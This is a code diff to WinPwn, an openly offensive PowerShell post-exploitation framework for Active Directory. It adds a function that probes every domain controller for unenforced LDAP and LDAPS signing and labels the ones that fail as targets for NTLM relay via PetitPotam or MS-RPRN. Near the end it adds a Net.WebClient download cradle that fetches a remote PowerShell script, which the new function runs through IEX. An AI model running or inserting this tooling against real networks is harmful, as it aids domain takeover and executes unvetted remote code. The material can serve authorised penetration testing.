@@ -1993,8 +1993,9 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '21. Check username=password combinations! '
         Write-Host -ForegroundColor Green '22. Get network interface IPs of all domain systems via IOXIDResolver! '
         Write-Host -ForegroundColor Green '23. Get the ADCS server(s) and templates + ESC8 Check! '
-        Write-Host -ForegroundColor Green '24. Search for vulnerable Domain Systems - RBCD via Petitpotam + LDAP relay'
-        Write-Host -ForegroundColor Green '25. Go back '
+        Write-Host -ForegroundColor Green '24. Search for vulnerable Domain Systems - RBCD via Petitpotam + LDAP relay!'
+        Write-Host -ForegroundColor Green '25. Check the Domain Controllers for LDAP Signing being enforced!'
+        Write-Host -ForegroundColor Green '26. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2025,9 +2026,68 @@ __        ___       ____
          22{Oxidresolver}
          23{ADCSInfos}
          24{Invoke-RBDC-over-DAVRPC}
+         25{Invoke-DCCheckLDAPSigning}
        }
     }
- While ($masterquestion -ne 25)
+ While ($masterquestion -ne 26)
+}
+
+function Invoke-DCCheckLDAPSigning
+{
+
+    Param
+    (   
+        [Switch]
+        $consoleoutput
+    )
+    if(!$consoleoutput){pathcheck}
+
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    IEX($admodule)
+    IEX($SystemDirectoryServicesProtocols)
+    $DCs = Get-ADDomainController
+    foreach ($DC in $DCs)
+    {
+        Write-Host -ForegroundColor Yellow "Checking " + $DC.Name + " over LDAP - 389"
+
+        $ServerName = $DC.Name + "." + $DC.Domain
+        $ServerName
+        $Port = 389
+        $dn = "$ServerName"+":"+"$Port"
+        $c = New-Object System.DirectoryServices.Protocols.LdapConnection $dn
+        $c.SessionOptions.SecureSocketLayer = $false
+        $c.SessionOptions.Signing = $false
+        $c.Bind()
+        if ($c.SessionOptions.Signing)
+        {
+            Write-Host -ForegroundColor Yellow $DC.Name + " set signing back to true, not vulnerable."
+        }
+        else
+        {
+            Write-Host -ForegroundColor Red  $DC.Name + " didnt enforce signing for an LDAP connection and is therefore vulnerable! You can relay HTTP Computer-AUTH (Petitpotam, MS-RPRN) or user authentication to this target!"
+            if(!$consoleoutput){$DC.Name >> "$currentPath\Vulnerabilities\NO_LDAP_Signing.txt"}
+        }
+
+        Write-Host -ForegroundColor Yellow "Checking " + $DC.Name + " over LDAPS - 636"
+
+        $Port = 636
+        $dn = "$ServerName"+":"+"$Port"
+        $d = New-Object System.DirectoryServices.Protocols.LdapConnection $dn
+        $d.SessionOptions.SecureSocketLayer = $true
+        $d.SessionOptions.Signing = $false
+        $d.Bind()
+        if ($d.SessionOptions.Signing)
+        {
+            Write-Host -ForegroundColor Yellow $DC.Name + " set signing back to true, not vulnerable."
+        }
+        else
+        {
+            Write-Host -ForegroundColor Red  $DC.Name + " didnt enforce signing for an LDAP connection and is therefore vulnerable! You can relay HTTP Computer-AUTH (Petitpotam, MS-RPRN) or user authentication to this target!"
+            if(!$consoleoutput){$DC.Name >> "$currentPath\Vulnerabilities\NO_LDAP_Signing.txt"}
+        }
+    }
+
 }
 
 function generaldomaininfo{
@@ -4243,5 +4303,6 @@ WinPwn -PowerSharpPack -consoleoutput -noninteractive					    -> Execute Seatbel
    
 }
 
+$SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/SystemDirectoryServicesProtocols-Import.ps1')
 $viewdevobfs = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
 $admodule = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')
